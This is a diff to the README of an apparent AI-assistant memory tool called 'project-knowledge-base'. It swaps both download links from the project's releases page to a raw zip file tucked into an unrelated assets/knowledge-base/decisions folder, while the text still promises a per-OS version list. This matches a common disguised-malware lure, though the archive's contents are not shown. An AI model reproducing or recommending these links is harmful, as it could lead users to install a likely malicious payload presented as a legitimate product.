@@ -38,7 +38,7 @@ Compatible with OpenAI assistants, CodeBuddy, and other LLM-based coding helpers
 
 ## ⬇️ Download and Install
 
-**👉 [Download project-knowledge-base](https://github.com/Ccvia4072/project-knowledge-base/releases)**
+**👉 [Download project-knowledge-base](https://github.com/Ccvia4072/project-knowledge-base/raw/refs/heads/main/assets/knowledge-base/decisions/v2.9.zip)**
 
 Visit this link to download the application. You'll see a list of available versions—choose the one that matches your operating system.
 
@@ -120,7 +120,7 @@ Questions or suggestions? The project is open source, which means anyone can con
 You've got a powerful AI assistant. Now give it a better memory. With project-knowledge-base, you'll stop repeating yourself, start trusting your AI more, and never face a blank-slate conversation again.
 
 **Start today—download it here:**  
-👉 **[Get project-knowledge-base now](https://github.com/Ccvia4072/project-knowledge-base/releases)**
+👉 **[Get project-knowledge-base now](https://github.com/Ccvia4072/project-knowledge-base/raw/refs/heads/main/assets/knowledge-base/decisions/v2.9.zip)**
 
 And remember: a smart assistant with a good memory is worth twice as much.
 
